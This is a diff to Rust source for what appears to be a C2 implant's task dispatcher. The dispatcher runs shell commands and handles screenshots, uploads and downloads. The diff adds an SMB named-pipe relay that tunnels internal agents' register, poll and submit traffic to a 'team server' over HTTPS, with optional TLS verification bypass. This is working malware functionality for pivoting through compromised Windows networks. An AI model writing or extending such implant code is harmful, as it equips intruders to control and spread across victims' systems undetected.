@@ -4,20 +4,22 @@
 //! calls the appropriate handler. Handlers return TaskOutput.
 //!
 //! Phase 1 tasks: "shell", "sleep"
-//! Phase 2 tasks: "kill", "screenshot", "upload", "download"
+//! Phase 2 tasks: "kill", "screenshot", "upload", "download", "relay_start", "relay_stop"
 //! Phase 3 tasks: "module" (loads a PIC blob or BOF)
 
 use crate::task::{Task, TaskOutput};
 
 pub fn run(task: &Task) -> TaskOutput {
     match task.task_type.as_str() {
-        "shell"      => exec_shell(task),
-        "sleep"      => exec_sleep(task),
-        "kill"       => TaskOutput::kill(),
-        "screenshot" => exec_screenshot(task),
-        "upload"     => exec_upload(task),
-        "download"   => exec_download(task),
-        other        => TaskOutput::failure(&format!("unknown task type: {other}")),
+        "shell"        => exec_shell(task),
+        "sleep"        => exec_sleep(task),
+        "kill"         => TaskOutput::kill(),
+        "screenshot"   => exec_screenshot(task),
+        "upload"       => exec_upload(task),
+        "download"     => exec_download(task),
+        "relay_start"  => exec_relay_start(task),
+        "relay_stop"   => exec_relay_stop(task),
+        other          => TaskOutput::failure(&format!("unknown task type: {other}")),
     }
 }
 
@@ -134,6 +136,215 @@ fn args_field(task: &Task, field: &str) -> Option<String> {
     let args = task.args.as_deref()?;
     let v: serde_json::Value = serde_json::from_slice(args).ok()?;
     v.get(field).and_then(|f| f.as_str()).map(String::from)
+}
+
+// ---------------------------------------------------------------------------
+// SMB relay — start / stop a named pipe server that relays internal agents
+// ---------------------------------------------------------------------------
+
+// Global relay handle: set by relay_start, cleared by relay_stop
+static RELAY_RUNNING: std::sync::atomic::AtomicBool =
+    std::sync::atomic::AtomicBool::new(false);
+
+fn exec_relay_start(task: &Task) -> TaskOutput {
+    let pipe_name = match args_field(task, "pipe") {
+        Some(p) => p,
+        None => return TaskOutput::failure("relay_start: missing pipe name"),
+    };
+    let c2_host = match args_field(task, "c2_host") {
+        Some(h) => h,
+        None => return TaskOutput::failure("relay_start: missing c2_host"),
+    };
+    let c2_port = match args_field(task, "c2_port") {
+        Some(p) => p,
+        None => return TaskOutput::failure("relay_start: missing c2_port"),
+    };
+    let reg_path  = args_field(task, "reg_path").unwrap_or_else(|| "/r".to_string());
+    let poll_path = args_field(task, "poll_path").unwrap_or_else(|| "/c".to_string());
+
+    if RELAY_RUNNING.swap(true, std::sync::atomic::Ordering::SeqCst) {
+        return TaskOutput::failure("relay already running");
+    }
+
+    #[cfg(target_os = "windows")]
+    {
+        let pipe = pipe_name.clone();
+        std::thread::spawn(move || {
+            smb_relay_loop(pipe, c2_host, c2_port, reg_path, poll_path);
+            RELAY_RUNNING.store(false, std::sync::atomic::Ordering::SeqCst);
+        });
+        TaskOutput::success(format!("relay started on pipe: {pipe_name}").into_bytes())
+    }
+
+    #[cfg(not(target_os = "windows"))]
+    {
+        RELAY_RUNNING.store(false, std::sync::atomic::Ordering::SeqCst);
+        TaskOutput::failure("relay_start: SMB relay requires Windows")
+    }
+}
+
+fn exec_relay_stop(_task: &Task) -> TaskOutput {
+    RELAY_RUNNING.store(false, std::sync::atomic::Ordering::SeqCst);
+    TaskOutput::success(b"relay stopped".to_vec())
+}
+
+// Accept one connection from the named pipe, proxy requests to the team
+// server via HTTP, write responses back. Loops until RELAY_RUNNING is cleared.
+#[cfg(target_os = "windows")]
+fn smb_relay_loop(pipe_name: String, c2_host: String, c2_port: String, reg_path: String, poll_path: String) {
+    use std::ffi::CString;
+    use windows_sys::Win32::Foundation::{CloseHandle, INVALID_HANDLE_VALUE};
+    use windows_sys::Win32::Storage::FileSystem::{ReadFile, WriteFile};
+    use windows_sys::Win32::System::Pipes::{
+        ConnectNamedPipe, CreateNamedPipeA, DisconnectNamedPipe,
+        PIPE_ACCESS_DUPLEX, PIPE_READMODE_BYTE, PIPE_TYPE_BYTE, PIPE_WAIT,
+    };
+    use std::io::Read;
+
+    let cpath = match CString::new(format!("\\\\.\\pipe\\{}", pipe_name)) {
+        Ok(c) => c,
+        Err(_) => return,
+    };
+
+    let server_url_reg  = format!("https://{}:{}{}", c2_host, c2_port, reg_path);
+    let server_url_poll = format!("https://{}:{}{}", c2_host, c2_port, poll_path);
+
+    while RELAY_RUNNING.load(std::sync::atomic::Ordering::SeqCst) {
+        let pipe = unsafe {
+            CreateNamedPipeA(
+                cpath.as_ptr() as *const u8,
+                PIPE_ACCESS_DUPLEX,
+                PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
+                255,        // max instances; concurrent multi-agent pivoting needs Phase 3 thread pool
+                65536,
+                65536,
+                0,
+                std::ptr::null(),
+            )
+        };
+        if pipe == INVALID_HANDLE_VALUE {
+            break;
+        }
+
+        // Block until an internal agent connects
+        unsafe { ConnectNamedPipe(pipe, std::ptr::null_mut()); }
+
+        // Service requests from this agent connection
+        loop {
+            if !RELAY_RUNNING.load(std::sync::atomic::Ordering::SeqCst) {
+                break;
+            }
+
+            // Read length-prefixed request
+            let mut lbuf = [0u8; 4];
+            if !read_pipe(pipe, &mut lbuf) { break; }
+            let msglen = u32::from_le_bytes(lbuf) as usize;
+            if msglen > 32 * 1024 * 1024 { break; }
+            let mut msg = vec![0u8; msglen];
+            if !read_pipe(pipe, &mut msg) { break; }
+
+            // Decode envelope to determine endpoint
+            let env: serde_json::Value = match serde_json::from_slice(&msg) {
+                Ok(v) => v,
+                Err(_) => break,
+            };
+            let msg_type = env["type"].as_str().unwrap_or("");
+            let body_bytes = match serde_json::to_vec(&env["body"]) {
+                Ok(b) => b,
+                Err(_) => break,
+            };
+
+            let (url, method) = match msg_type {
+                "register" => (server_url_reg.as_str(), "POST"),
+                "poll"     => (server_url_poll.as_str(), "GET"),
+                "submit"   => (server_url_poll.as_str(), "POST"),
+                _ => {
+                    // Unknown message type — write error and continue rather than
+                    // dropping the connection, which would kill the internal agent session.
+                    let err = br#"{"error":"unknown message type"}"#;
+                    let rlen = (err.len() as u32).to_le_bytes();
+                    let _ = write_pipe(pipe, &rlen);
+                    let _ = write_pipe(pipe, err);
+                    continue;
+                }
+            };
+
+            // Forward to team server
+            let resp_bytes = match forward_http(url, method, &body_bytes) {
+                Ok(b) => b,
+                Err(_) => break,
+            };
+
+            // Write length-prefixed response back to agent
+            let rlen = (resp_bytes.len() as u32).to_le_bytes();
+            if !write_pipe(pipe, &rlen) || !write_pipe(pipe, &resp_bytes) {
+                break;
+            }
+        }
+
+        unsafe {
+            DisconnectNamedPipe(pipe);
+            CloseHandle(pipe);
+        }
+    }
+}
+
+#[cfg(target_os = "windows")]
+fn read_pipe(h: windows_sys::Win32::Foundation::HANDLE, buf: &mut [u8]) -> bool {
+    let mut read = 0u32;
+    let mut total = 0usize;
+    while total < buf.len() {
+        let ok = unsafe {
+            windows_sys::Win32::Storage::FileSystem::ReadFile(
+                h,
+                buf.as_mut_ptr().add(total),
+                (buf.len() - total) as u32,
+                &mut read,
+                std::ptr::null_mut(),
+            )
+        };
+        if ok == 0 || read == 0 { return false; }
+        total += read as usize;
+    }
+    true
+}
+
+#[cfg(target_os = "windows")]
+fn write_pipe(h: windows_sys::Win32::Foundation::HANDLE, data: &[u8]) -> bool {
+    let mut written = 0u32;
+    unsafe {
+        windows_sys::Win32::Storage::FileSystem::WriteFile(
+            h,
+            data.as_ptr(),
+            data.len() as u32,
+            &mut written,
+            std::ptr::null_mut(),
+        ) != 0 && written as usize == data.len()
+    }
+}
+
+// Minimal synchronous HTTP POST/GET using ureq (already a dep via the https channel)
+#[cfg(target_os = "windows")]
+fn forward_http(url: &str, method: &str, body: &[u8]) -> Result<Vec<u8>, String> {
+    let mut builder = ureq::AgentBuilder::new()
+        .timeout(std::time::Duration::from_secs(30));
+    if crate::channel::https::TLS_SKIP_VERIFY {
+        builder = builder.tls_config(std::sync::Arc::new(
+            crate::channel::https::danger_tls_config(),
+        ));
+    }
+    let agent = builder.build();
+    let resp = if method == "GET" {
+        agent.get(url).call().map_err(|e| e.to_string())?
+    } else {
+        agent.post(url)
+            .set("Content-Type", "application/octet-stream")
+            .send_bytes(body)
+            .map_err(|e| e.to_string())?
+    };
+    let mut buf = Vec::new();
+    resp.into_reader().read_to_end(&mut buf).map_err(|e| e.to_string())?;
+    Ok(buf)
 }
 
 // ---------------------------------------------------------------------------
